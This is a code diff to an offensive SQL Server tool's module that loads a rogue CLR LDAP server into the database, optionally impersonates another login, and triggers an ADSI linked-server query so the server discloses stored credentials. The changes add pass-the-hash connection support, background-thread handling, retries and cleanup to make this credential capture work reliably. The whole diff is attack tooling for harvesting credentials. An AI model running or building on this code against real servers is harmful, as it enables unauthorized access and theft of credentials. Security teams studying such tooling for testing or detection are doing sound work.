@@ -198,33 +198,15 @@ namespace SQLRecon.Modules
 
             if (string.IsNullOrEmpty(impersonate))
             {
-                try
-                {
-                    SqlCommand query = new(queries["load_ldap_server"], con);
-
-                    query.ExecuteNonQuery();
-                }
-                catch (Exception e)
-                {
-                    Print.Error($"{e}", true);
-                }
+                Sql.NonQuery(con, queries["load_ldap_server"]);
             }
             else
             {
-                try
-                {
-                    SqlCommand query = new(queries["login"], con);
-
-                    query.ExecuteNonQuery();
-
-                    query = new(queries["load_ldap_server"], con);
-
-                    query.ExecuteNonQuery();
-                }
-                catch (Exception e)
-                {
-                    Print.Error($"{e}", true);
-                }
+                // Run EXECUTE AS LOGIN first (establishes impersonation context on the connection),
+                // then CREATE PROCEDURE in that context. These must be separate batches because
+                // CREATE/ALTER PROCEDURE must be the first statement in a query batch.
+                Sql.NonQuery(con, queries["login"]);
+                Sql.NonQuery(con, queries["load_ldap_server"]);
             }
 
             // Verify that the LDAP server assembly has been created.
@@ -246,30 +228,92 @@ namespace SQLRecon.Modules
 
             Print.Status($"Starting a local LDAP server on port {port}.", true);
 
-            /* Start the LDAP server, which will store the credentials in 'sqlOutput'.
-            * This is a long-running query that will hang the 'con' connection object until
-            * an LDAP connection has been established.
-            */
-            Task.Run(() =>
-                sqlOutput = Sql.Query(con, queries["start_ldap_server"])
-            );
-
-            Print.Status("Executing LDAP solicitation ...", true);
-
             /* Create a new SQL connection object as we need to have a second
-            *  connection to the database.This is because the first
+            *  connection to the database. This is because the first
             *  connection object ('con') is being used to run the LDAP server.
             */
             SqlConnection conTwo = SetAuthenticationType.CreateSqlConnectionObject();
 
-            // This is not a typo, the query does need to be executed twice in order for the function and assembly to be removed cleanly.
-            Sql.CustomQuery(conTwo, queries["run_ldap_server"]);
-            Sql.CustomQuery(conTwo, queries["run_ldap_server"]);
+            PTHTdsConnection pthConn = PthState.Unwrap(con);
+            System.Threading.Thread pthLdapThread = null;
+
+            // Reset sqlOutput so that a stale value from a prior query (e.g.
+            // list_assemblies_modules) is never mistaken for credentials if the
+            // background thread times out without setting it.
+            sqlOutput = "";
+
+            if (pthConn != null)
+            {
+                // For PTH: run start_ldap_server on a background thread so that the thread
+                // is actively reading from pthConn's TCP socket during the LDAP exchange.
+                // If nobody reads from pthConn, the OS TCP receive window fills up when SQL
+                // Server tries to send the CLR result back, blocking session 1. Session 2's
+                // OPENQUERY then waits for session 1 to finish — a TCP flow deadlock.
+                // Use ManualResetEventSlim to guarantee the packet is on the wire before
+                // run_ldap_server fires.
+                var packetSent = new System.Threading.ManualResetEventSlim(false);
+                pthLdapThread = new System.Threading.Thread(() =>
+                {
+                    pthConn.SendOnly(queries["start_ldap_server"]);
+                    packetSent.Set(); // packet is on the wire; SQL Server is executing CLR
+                    sqlOutput = pthConn.ReceiveQueryResult(); // blocks until CLR returns
+                });
+                pthLdapThread.IsBackground = true;
+                pthLdapThread.Start();
+                packetSent.Wait(); // ensure start_ldap_server is sent before proceeding
+                System.Threading.Thread.Sleep(2000); // give CLR time to open the LDAP listener
+
+                // Give conTwo a 60-second receive timeout so that if session 2's OPENQUERY
+                // hangs waiting for the ADSI linked server, it eventually unblocks rather
+                // than hanging indefinitely.
+                PthState.Unwrap(conTwo)?.SetReceiveTimeout(60000);
+            }
+            else
+            {
+                Task.Run(() =>
+                    sqlOutput = Sql.Query(con, queries["start_ldap_server"])
+                );
+            }
+
+            Print.Status("Executing LDAP solicitation ...", true);
+
+            if (pthConn != null)
+            {
+                // For PTH: retry the OPENQUERY solicitation up to 5 times with short delays.
+                // The CLR listener may not be ready on the first attempt, or the ADSI linked
+                // server connection may fail transiently. We stop retrying as soon as the
+                // background thread (ReceiveQueryResult) signals it has the credentials.
+                // Print the OPENQUERY result for diagnosis.
+                for (int _attempt = 1; _attempt <= 5; _attempt++)
+                {
+                    Sql.CustomQuery(conTwo, queries["run_ldap_server"]);
+                    if (pthLdapThread.Join(2000)) // 2s: did the background thread finish?
+                        break;
+                    if (_attempt < 5)
+                        System.Threading.Thread.Sleep(1000);
+                }
+                pthLdapThread.Join(30000); // 30-second hard timeout to prevent infinite hang
+
+                // If the background thread is still alive the CLR LDAP function is still
+                // running on session 1. DROP FUNCTION would hang waiting for a schema lock.
+                // Close the TCP connection to force SQL Server to abort the CLR session,
+                // so cleanup can proceed on conTwo.
+                if (pthLdapThread.IsAlive)
+                    pthConn.Dispose();
+            }
+            else
+            {
+                // This is not a typo, the query does need to be executed twice in order
+                // for the function and assembly to be removed cleanly.
+                Sql.CustomQuery(conTwo, queries["run_ldap_server"]);
+                Sql.CustomQuery(conTwo, queries["run_ldap_server"]);
+                pthLdapThread?.Join();
+            }
 
             // Check to see if the credentials have been obtained.
-            if (Print.IsOutputEmpty(sqlOutput).Contains("No Results"))
+            if (string.IsNullOrWhiteSpace(sqlOutput))
             {
-                Print.IsOutputEmpty(sqlOutput, true);
+                Print.Error("No credentials obtained.", true);
             }
             else
             {
@@ -284,10 +328,13 @@ namespace SQLRecon.Modules
             Sql.Query(conTwo, queries["drop_clr_hash"]);
             
             // Ensure that the database trustworthy property is reverted.
+            // For PTH: the background thread may still hold 'con', so use conTwo to
+            // avoid a deadlock on the shared TCP connection.
             if (version <= 13)
             {
                 Print.Status($"Turning off the trustworthy property on '{Var.Database}'.", true);
-                Sql.Query(con, queries["database_trust_off"]);
+                SqlConnection trustOffCon = (pthConn != null) ? conTwo : con;
+                Sql.Query(trustOffCon, queries["database_trust_off"]);
             }
         }
 
@@ -507,16 +554,7 @@ namespace SQLRecon.Modules
              * 'CREATE/ALTER PROCEDURE' must be the first statement in a query batch.
              */
             
-            try
-            {
-                SqlCommand query = new(queries["rpc_load_ldap_server"], con);
-
-                query.ExecuteNonQuery();
-            }
-            catch (Exception e)
-            {
-                Print.Error($"{e}", true);
-            }
+            Sql.NonQuery(con, queries["rpc_load_ldap_server"]);
 
             // Verify that the LDAP server assembly has been created.
             sqlOutput = Sql.CustomQuery(con, queries["list_assemblies_modules"]);
@@ -538,31 +576,50 @@ namespace SQLRecon.Modules
             Print.Status($"Starting a local LDAP server on port {port}.", true);
 
             /*
-             * Start the LDAP server, which will store the credentials in 'sqlOutput'.
-             * This is a long-running query that will hang the 'con' connection object until
-             * an LDAP connection has been established.
-             */
-            Task.Run(() =>
-                sqlOutput = Sql.Query(con, queries["start_ldap_server"])
-            );
-
-            Print.Status("Executing LDAP solicitation ...", true);
-
-            /*
              * Create a new SQL connection object as we need to have a second
              * connection to the database. This is because the first
              * connection object ('con') is being used to run the LDAP server.
-            */
+             */
             SqlConnection conTwo = SetAuthenticationType.CreateSqlConnectionObject();
-            
+
+            // For PTH: send the LDAP server packet first so SQL Server starts the listener
+            // before run_ldap_server triggers the solicitation (see StandardOrImpersonation).
+            PTHTdsConnection pthConn = PthState.Unwrap(con);
+            System.Threading.Thread pthLdapThread = null;
+
+            if (pthConn != null)
+            {
+                var packetSent = new System.Threading.ManualResetEventSlim(false);
+                pthLdapThread = new System.Threading.Thread(() =>
+                {
+                    pthConn.SendOnly(queries["start_ldap_server"]);
+                    packetSent.Set();
+                    sqlOutput = pthConn.ReceiveQueryResult();
+                });
+                pthLdapThread.IsBackground = true;
+                pthLdapThread.Start();
+                packetSent.Wait();
+                System.Threading.Thread.Sleep(2000);
+            }
+            else
+            {
+                Task.Run(() =>
+                    sqlOutput = Sql.Query(con, queries["start_ldap_server"])
+                );
+            }
+
+            Print.Status("Executing LDAP solicitation ...", true);
+
             // This is not a typo, the query does need to be executed twice in order for the function and assembly to be removed cleanly.
             Sql.CustomQuery(conTwo, queries["run_ldap_server"]);
             Sql.CustomQuery(conTwo, queries["run_ldap_server"]);
-            
+
+            pthLdapThread?.Join();
+
             // Check to see if the credentials have been obtained.
-            if (Print.IsOutputEmpty(sqlOutput).Contains("No Results"))
+            if (string.IsNullOrWhiteSpace(sqlOutput))
             {
-                Print.IsOutputEmpty(sqlOutput, true);
+                Print.Error("No credentials obtained.", true);
             }
             else
             {
